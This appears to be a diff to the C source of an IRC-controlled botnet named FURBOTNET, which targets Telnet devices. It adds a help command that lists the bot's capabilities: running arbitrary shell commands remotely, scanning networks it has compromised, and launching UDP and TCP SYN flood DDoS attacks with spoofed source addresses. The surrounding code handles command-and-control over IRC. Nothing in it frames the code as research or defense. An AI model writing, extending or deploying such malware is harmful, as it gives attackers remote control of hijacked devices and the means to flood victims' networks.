@@ -146,6 +146,8 @@ int irc_login(irc_info *info) {
 }
 
 int irc_send(char *msg, int len, irc_info *info) {
+	if (!len)
+		len = strlen(msg);
 
 	char *PRIVMSG = malloc(len + strlen("PRIVMSG") + strlen(info->ch) + 10);
 	snprintf(PRIVMSG, len + strlen(info->ch) + 12, "PRIVMSG %s :%s\n", info->ch, msg);
@@ -283,6 +285,27 @@ int irc_listen(irc_info *info) {
 
 			} else if (!strcmp(":@kill", master_cmd[3])) {
 				exit(EXIT_SUCCESS);
+			} else if (!strcmp(":@help", master_cmd[3])) {
+				irc_send("\x02 FURBOTNET - IRC Botnet for Telnet devices\n\x02", 0, info);
+				irc_send("Tip: You can send commands directly to specific bot using /msg <botname> <command>\n", 0, info);
+				irc_send("\x02 Commands:\n\x02", 0, info);
+				irc_send("\x02!<shell command> :\x02 Run a shell command and get the output back. Use ! followed by a shell command e.g. \x02!ls\x02\n", 0, info);
+				irc_send("\x02@help\x02 : print this screen :\n", 0, info);
+				irc_send("\x02@kill\x02 : kill bot process:\n", 0, info);
+				irc_send("\x02@scan <ip>\x02 :\n", 0, info);
+			       	irc_send("         Make a scanning of the network passed, the scan only test the fourth octet\n", 0, info);
+				irc_send("         e.g \x02@scan 172.17.0.0\x02 will scan from 172.17.0.1 to 172.17.0.254. If is ommited or set to 0\n", 0, info);
+			       	irc_send("         then the bot IP itself is assumed. Let blank can be useful in compromised networks where bot is sit in\n", 0, info);
+				irc_send("\x02@attack udp <target ip> <number of packets> <source port | 0> <destination port | 0> <rate | 0> <spoof | nospoof> <spoofed ip | 0> : \x02\n", 0, info);
+			       	irc_send("         launches DDoS attack of type UDP flood. is the ip of the victim. if or is zero they are randomized at every packets\n", 0, info);
+				irc_send("         e.g. @attack 172.17.0.1 1000 22 0 200 nospoof will launch 1000 UDP packets with 5 different destination ports i.e 200 packets\n", 0, info);
+			        irc_send("         for every random destination port, source port will be 22 in all packets, unless setted to zero too. can be setted to zero for default change\n", 0, info);
+				irc_send("         wich is 100. spoof or nospoof is used to determine if source IP address of the packets is true or not. will use the bot ip address, \n", 0, info);
+				irc_send("         will use as source address, if is zero then source ip is randomized at every packets\n", 0, info);
+				irc_send("\x02@attack tcp <target ip> <number of packets> <source port | 0> <destination port | 0> : \x02\n", 0, info);
+			        irc_send("          same as UDP attack, but source IP is spoofed \n", 0, info);
+				irc_send("          and random at every packet, same as port, if ports are setted to zero they are randomized at every packet. \n", 0, info);
+				irc_send("          TCP SYN flood implies spoofed source IP\n", 0, info);
 			}
 
 		free_master_cmd(master_cmd, token_len);
